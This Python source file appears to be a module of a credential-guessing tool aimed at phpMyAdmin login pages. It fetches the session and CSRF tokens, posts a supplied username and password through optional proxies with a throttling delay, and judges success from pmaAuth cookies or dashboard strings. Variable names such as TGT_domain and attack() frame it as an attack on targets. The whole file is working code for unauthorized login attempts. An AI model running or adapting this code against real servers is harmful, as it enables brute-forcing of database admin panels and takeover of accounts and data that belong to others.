import importlib
import re
Req = importlib.import_module('Core.Core_Helper')


NO_USED = None

class PhpMyAdminLogin_OkorNOT:
    def __init__(self, TGT_domain, TGT_user, TGT_password, TGT_sess, TGT_Proxies, User_Agent):
        self.pma_domain = TGT_domain
        self.pma_user = TGT_user
        self.pma_passwd = TGT_password
        self.sess_ = TGT_sess
        self.Proxies_ON = TGT_Proxies 
        self.SET_Timeout = 15 if self.Proxies_ON else 10
        #print('Timeout in PhpMyAdminLogin_Threaded :', self.SET_Timeout)
        self.PMA_LOGATTACK = self.attack()
        self.Config_UA = {'User-Agent': User_Agent}
        
        
    def SearchingKey(self, res):
        text = str(res.text)
        cookies = str(res.cookies)
        #print(cookies)

        cookie_key = [['pmaAuth-1', 'pmaUser-1'],]
        text_keys = [
            'href="logout.php',
            'server_databases.php',
            'src="navigation.php?token=',
            'phpMyAdmin is more friendly with a',
            'Server:        localhost',
            'Database server',
            'Version information:',
            'The phpMyAdmin configuration storage is not completely configured',
            'index.php?route=%2F&amp;server=1',
            'Version information:'
        ]
        for k in cookie_key:
            found_all = True
            for key in k:
                if key not in cookies:
                    #if key is bad and key1 is Found still bad because one of them was failed ready
                    found_all = False 
                    break
            if found_all:
                #print("Found both Keys")
                return True
            #print("Not all keys Found")

        #if cookies not work but need try simple method 
        for i in text_keys:
            if i in text:
                return True

        return False

    def attack(self):
        try:
            #print(self.Proxies_ON)
            GET_SESS = Req.Threaded_GET(
                self.pma_domain, 
                NO_USED, 
                self.SET_Timeout,     
                self.Config_UA, 
                NO_USED, 
                NO_USED,
                False,
                'sess_get',
                self.Proxies_ON,
                self.sess_,
            ).run()
            res_session = [GET_SESS[i] for i in GET_SESS][0]
            
            try:
                Set_SESS = re.findall(r'name="set_session" value="(.*?)"', res_session['resp'].text)[0]
            except:
                Set_SESS = NO_USED

            try:
                PMA_Token = re.findall(r'name="token" value="(.*?)"', res_session['resp'].text)[0]
            except:
                PMA_Token = NO_USED

            post_data = {
                'set_session': Set_SESS if Set_SESS else '',
                'token': PMA_Token if PMA_Token else '',
                'pma_username': self.pma_user,
                'pma_password': self.pma_passwd,
            }
            
            POST_CHECKLOGIN = Req.Threaded_POST(
                CFG_DOMAIN=self.pma_domain, 
                CFG_VULN=NO_USED, 
                CFG_TIMEOUT=self.SET_Timeout, 
                CFG_USERAGENT=self.Config_UA,
                CFG_DATA=post_data,
                CFG_FILE_UPLOAD=NO_USED,
                CFG_RAW_BODY=NO_USED,
                CFG_DELAY_ATTACK=0.7,
                CFG_MODE="sess_post",
                SET_REDIRECT=NO_USED,
                CFG_Proxies=self.Proxies_ON,
                Mem_Sess=self.sess_,
            ).run()
            RES_SESS = [POST_CHECKLOGIN[i] for i in POST_CHECKLOGIN][0]
            
            return self.SearchingKey(RES_SESS['resp'])
        except:
            return False